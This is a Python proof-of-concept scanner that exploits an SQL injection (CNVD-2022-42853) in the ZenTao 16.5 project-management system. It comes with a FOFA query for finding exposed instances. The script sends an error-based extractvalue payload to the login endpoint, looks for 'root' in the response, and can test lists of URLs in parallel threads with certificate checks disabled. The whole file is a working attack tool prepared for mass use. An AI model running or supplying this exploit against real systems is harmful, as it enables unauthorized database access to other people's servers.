#fofa搜索语法 body="/js/all.js?v=16.5"
#CNVD-2022-42853
#运行格式 python main.py -u url              python main.py -f file.txt
from urllib.parse import urlsplit
import argparse
import requests
import re
import threading
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

def banner():
    print("""
    -------------------------------  
        禅道16.5 SQL注入  by 菜菜
    -------------------------------
    """)
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Accept":"application/json, text/javascript, */*; q=0.01",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
}
vulRul = []
data={"account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"}
def urlCheck(url):
    parsed_url = urlsplit(url)
    url = parsed_url.scheme+"://"+parsed_url.netloc+"/user-login.html"
    urlTest(url)
def urlTest(url):
    banner()
    try:
        res = requests.post(url,data=data,headers=headers,verify=False,timeout=3)
        parsed_url = urlsplit(url)
        url = parsed_url.scheme+"://"+parsed_url.netloc
        if ("root" in res.text):
            vulRul.append(url)
            print(url+"漏洞存在")
        else:
            print(url+"漏洞不存在")
    except RequestException:
        print("请求超时")
def main():
    # 禁用警告
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    parser = argparse.ArgumentParser(description="读取命令行参数")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL 参数')
    group.add_argument('-f', '--file', help='file 参数')
    args = parser.parse_args()
    if args.url:
        urlCheck(args.url)
    elif args.file:
        threads_queue=[]
        with open(args.file, 'r') as file:
            for line in file:
                line=line.strip()
                read_thread = threading.Thread(target=urlCheck, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulRul:
        print(url+"  [+]漏洞存在！！！")

if __name__ == "__main__":
    main()
